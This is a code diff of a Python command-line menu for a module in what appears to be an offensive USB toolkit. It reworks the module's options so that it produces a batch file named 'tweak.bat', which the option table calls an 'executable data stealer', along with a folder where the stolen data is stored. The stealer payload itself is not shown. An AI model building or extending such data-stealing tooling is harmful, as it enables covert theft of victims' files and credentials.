@@ -12,8 +12,8 @@ module = module.split("/")
 name = module[1]+'/'+module[2]
 
 # options
-NAME = ""
-PATH_CP = ""
+FOLDER = ""
+NAME = "tweak.bat"
 help_menu = '''
 Global Commands
 =================
@@ -57,10 +57,10 @@ while True:
 --> Options of the ({name}) module:
 ========================================================
 
-    option              description                         current value
-    ------              -----------                         -------------
-    NAME                The filename                        {NAME}
-    PATH_CP             The file path to copy               {PATH_CP}
+    option              description                                   current value
+    ------              -----------                                   -------------
+    FOLDER              Folder name where data will be stored         {FOLDER} 
+    NAME                Name of the executable data stealer file      {NAME}
 ''')
                 else:
                     print(Fore.RED+'[-]'+Fore.RESET+' Not a valid menu: '+usbf[1])
@@ -75,22 +75,22 @@ while True:
                     print(Fore.RED+'[-]'+Fore.RESET+' Unknown digital option: '+str(usbf[1]))
                 else:
                     use = usbf[1].upper()
-                    if use == "NAME":
-                        NAME=str(usbf[2])
+                    if use == "FOLDER":
+                        FOLDER=str(usbf[2])
+                        print(Fore.BLUE+'[i]'+Fore.RESET+f' {use} ==> {FOLDER}')
+                    elif use == "NAME":
+                        NAME=str(usbf[2])+'.bat'
                         print(Fore.BLUE+'[i]'+Fore.RESET+f' {use} ==> {NAME}')
-                    elif use == "PATH_CP":
-                        PATH_CP=str(usbf[2])
-                        print(Fore.BLUE+'[i]'+Fore.RESET+f' {use} ==> {PATH_CP}')
                     else:
                         print(Fore.RED+'[-]'+Fore.RESET+' Unknown option: '+usbf[1]) 
             except:
                 pass
     elif usbf[0] == 'start' or usbf[0] == 'run' or usbf[0] == 'execute':
-        if NAME == "" or PATH_CP == "":
+        if FOLDER == "":
             print(Fore.RED+'[-]'+Fore.RESET+' Please setup all the required (blank) options!')
         else:
             try:
-                os.system(f'python3 {run} {NAME} {PATH_CP}')
+                os.system(f'python3 {run} {FOLDER} {NAME}')
             except:
                 pass
             print(Fore.BLUE+'[i]'+Fore.RESET+' Module execution completed.')
